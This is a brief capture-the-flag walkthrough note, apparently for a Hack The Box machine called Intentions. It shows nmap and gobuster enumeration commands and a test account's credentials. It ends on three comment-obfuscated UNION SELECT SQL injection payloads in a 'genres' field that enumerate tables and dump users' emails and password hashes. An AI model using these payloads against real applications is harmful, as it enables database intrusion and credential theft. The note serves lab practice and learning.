Intentions
========================

## Enumeration

    sudo nmap_enum intentions.htb | tee nmap_output.txt

![qownnotes-media-ATEfFZ](../../../media/qownnotes-media-ATEfFZ.png)

    sudo nmap -p- -Pn -T5 -n intentions.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-kxuRfw](../../../media/qownnotes-media-kxuRfw.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn intentions.htb | tee nmap_udp_output.txt

![qownnotes-media-fwhIiC](../../../media/qownnotes-media-fwhIiC.png)

    sudo nmap -sS --script vuln -n -T5 -Pn intentions.htb -p 80,22 | tee nmap_vulns.txt

![qownnotes-media-rTDxrB](../../../media/qownnotes-media-rTDxrB.png)


### HTTP

    gobuster dir -u http://intentions.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_s_ext_gobuster.txt"

![qownnotes-media-ffQEdp](../../../media/qownnotes-media-ffQEdp.png)

![qownnotes-media-gYWtgO](../../../media/qownnotes-media-gYWtgO.png)

name: red team
email: redteam@teste.com
Password:  R3dT3am

![qownnotes-media-PIuNIJ](../../../media/qownnotes-media-PIuNIJ.png)

![qownnotes-media-HAfxyF](../../../media/qownnotes-media-HAfxyF.png)

```
"genres":"')/**/UNION/**/SELECT/**/1,table_name,3,4,5/**/from/**/information_schema.tables#"
"genres":"')/**/UNION/**/SELECT/**/1,column_name,3,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#"
"genres":"')/**/UNION/**/SELECT/**/1,concat(email,0x3a,password,0x3a,admin),3,4,5/**/from/**/users#"